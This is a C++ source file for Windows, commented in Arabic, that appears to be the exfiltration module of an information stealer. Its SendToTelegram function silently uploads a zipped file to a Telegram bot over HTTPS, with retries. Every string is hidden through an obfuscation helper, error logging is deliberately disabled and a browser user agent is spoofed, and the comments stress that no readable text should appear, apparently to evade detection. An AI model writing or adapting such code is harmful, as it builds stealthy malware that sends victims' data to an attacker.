// telegram_client.cpp – نسخة معتمدة كلياً على GetObfuscatedString (بدون رسائل واضحة)
#include "telegram_client.h"
#include "../crypto/obfuscation.h"
#include <windows.h>
#include <wininet.h>
#include <string>
#include <fstream>
#include <vector>

#pragma comment(lib, "wininet.lib")

// دالة مساعدة (تكتب خطأ في ملف إذا أردت، لكن لا نستخدم سلاسل نصية واضحة)
static void LogError(const std::string& msg) {
    // يمكن تركها فارغة أو تعطيلها تماماً في الإصدار النهائي
    // لتجنب ظهور أي نصوص، لا نطبع أي شيء.
    (void)msg; // unused
}

bool SendToTelegram(const std::string& filePath, const std::string& botToken, const std::string& chatId) {
    // استرجاع السلاسل المشفرة
    std::string apiHost = GetObfuscatedString(STR_API_TELEGRAM);        // "api.telegram.org"
    std::string botPath = GetObfuscatedString(STR_BOT_TOKEN_PLACE);     // "/bot"
    std::string sendDocPath = GetObfuscatedString(STR_SEND_DOCUMENT);   // "/sendDocument"
    std::string userAgent = GetObfuscatedString(STR_USER_AGENT);        // "Mozilla/5.0 ..."
    std::string boundaryPrefix = GetObfuscatedString(STR_MULTIPART_BOUNDARY); // "----"
    std::string chatDisposition = GetObfuscatedString(STR_CONTENT_DISPOSITION_CHAT); // "Content-Disposition: form-data; name=\"chat_id\""
    std::string docDisposition = GetObfuscatedString(STR_CONTENT_DISPOSITION_DOC);   // "Content-Disposition: form-data; name=\"document\"; filename=\"data.zip\""
    std::string contentTypeZip = GetObfuscatedString(STR_CONTENT_TYPE_ZIP);          // "application/zip"
    
    const int MAX_RETRIES = 3;
    for (int attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        // قراءة الملف
        std::ifstream file(filePath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            // لا نكتب رسالة خطأ نصية واضحة
            continue;
        }
        std::streamsize fileSize = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<char> fileData(fileSize);
        if (!file.read(fileData.data(), fileSize)) {
            continue;
        }
        file.close();

        // بناء multipart/form-data (باستخدام السلاسل المشفرة)
        std::string boundary = boundaryPrefix + std::to_string(GetCurrentProcessId()) + std::to_string(attempt);
        std::string bodyStart;
        bodyStart += "--" + boundary + "\r\n";
        bodyStart += chatDisposition + "\r\n\r\n";
        bodyStart += chatId + "\r\n";
        bodyStart += "--" + boundary + "\r\n";
        bodyStart += docDisposition + "\r\n";
        bodyStart += "Content-Type: " + contentTypeZip + "\r\n\r\n";

        std::string bodyEnd = "\r\n--" + boundary + "--\r\n";
        std::string fullBody = bodyStart + std::string(fileData.data(), fileData.size()) + bodyEnd;

        // إعداد الاتصال
        HINTERNET hSession = InternetOpenA(userAgent.c_str(),
                                            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hSession) {
            continue;
        }

        HINTERNET hConnect = InternetConnectA(hSession, apiHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT,
                                              NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hSession);
            continue;
        }

        std::string path = botPath + botToken + sendDocPath;
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL,
                                              INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            continue;
        }

        std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary;
        BOOL sent = HttpSendRequestA(hRequest, headers.c_str(), headers.size(),
                                     (LPVOID)fullBody.c_str(), fullBody.size());

        // قراءة الرد (يمكن تجاهله، أو فحصه بدون طباعة نصوص واضحة)
        char buffer[1024];
        DWORD bytesRead;
        std::string response;
        if (sent) {
            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                response += buffer;
            }
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);

        // التحقق من وجود "\"ok\":true" في الرد (نستخدم strstr بدلاً من find لتجنب ظهور نص "ok":true في الكود؟ لكن النص "ok":true لا يظهر في الكود مباشرة، بل في response. لكن response قد تحتويه. نحن لا نطبعها، لذا آمن. نكتفي بالتحقق.
        if (sent && response.find("\"ok\":true") != std::string::npos) {
            return true;
        }
        // نوم بسيط قبل إعادة المحاولة (لا نستخدم رسالة نصية واضحة)
        Sleep(2000 * attempt);
    }
    return false;
}